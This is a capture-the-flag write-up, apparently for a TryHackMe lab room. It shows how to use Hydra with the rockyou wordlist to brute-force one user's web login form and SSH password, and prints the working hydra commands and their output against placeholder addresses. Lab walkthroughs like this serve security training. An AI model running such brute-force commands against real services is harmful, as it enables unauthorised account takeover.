```
                                                             
     #####    ##                  ##                         
  ######  /  #### /                ##                        
 /#   /  /   ####/                 ##                        
/    /  /    # #                   ##                        
    /  /     #                     ##                        
   ## ##     #  ##   ####      ### ##  ###  /###     /###    
   ## ##     #   ##    ###  / ######### ###/ #### / / ###  / 
   ## ########   ##     ###/ ##   ####   ##   ###/ /   ###/  
   ## ##     #   ##      ##  ##    ##    ##       ##    ##   
   ## ##     ##  ##      ##  ##    ##    ##       ##    ##   
   #  ##     ##  ##      ##  ##    ##    ##       ##    ##   
      /       ## ##      ##  ##    ##    ##       ##    ##   
  /##/        ## ##      ##  ##    /#    ##       ##    /#   
 /  #####      ## #########   ####/      ###       ####/ ##  
/     ##            #### ###   ###        ###       ###   ## 
#                         ###                                
 ##                #####   ###                               
                 /#######  /#                                
                /      ###/
```
Learn about and use Hydra, a fast network logon cracker, to bruteforce and obtain a 
website's credentials. [^1]

Use Hydra to bruteforce molly's web password. What is flag 1?
-----------------------------------------------------------------------------------------
Upon navigation to the website `http://<MACHINE_IP_ADDRESS>` we are prompted with a
regular login webpage. Thus, we open the *Network* tab in the developer tools and enter
"molly" for the username with a sample password. The POST request then returns the form
data *username* and *password* as expected and the response further contains the string
"incorrect".
The question's hint advises us to use a `RockYou.txt` passwords file. This file, with the
suspected passwords can be discovered using `find` in the attack box.
```
# find / -iname "RockYou.txt" 2>/dev/null
/usr/share/wordlists/rockyou.txt
```
The hydra brute force can therefore be constructed as follows. Finally, we obtain the
password for "molly".
```
# hydra -l molly -P "/usr/share/wordlists/rockyou.txt" <MACHINE_IP_ADDRESS> \
    http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
<--snip-->
[80][http-post-form] host: <MACHINE_IP_ADDRESS> login: molly password: [REDACTED]
```

Use Hydra to bruteforce molly's SSH password. What is flag 2?
-----------------------------------------------------------------------------------------
The hydra usage is pretty straightforward with the password list file from the previous
task and protocol suite set to `ssh` and a parallel thread amount of 5. This way, we can
again obtain the `ssh` password and login for the second flag.
```
# hydra -l molly -P "/usr/share/wordlists/rockyou.txt" <MACHINE_IP_ADDRESS> -t 5 -V ssh
<--snip-->
[DATA] attacking ssh://<MACHINE_IP_ADDRESS>:22/
[22][ssh] host: <MACHINE_IP_ADDRESS> login: molly password: [REDACTED]
# ssh molly@<MACHINE_IP_ADDRESS>
molly@ip-<MACHINE_IP_ADDRESS>:~$ cat flag2.txt
```


[^1]: https://tryhackme.com/room/hydra
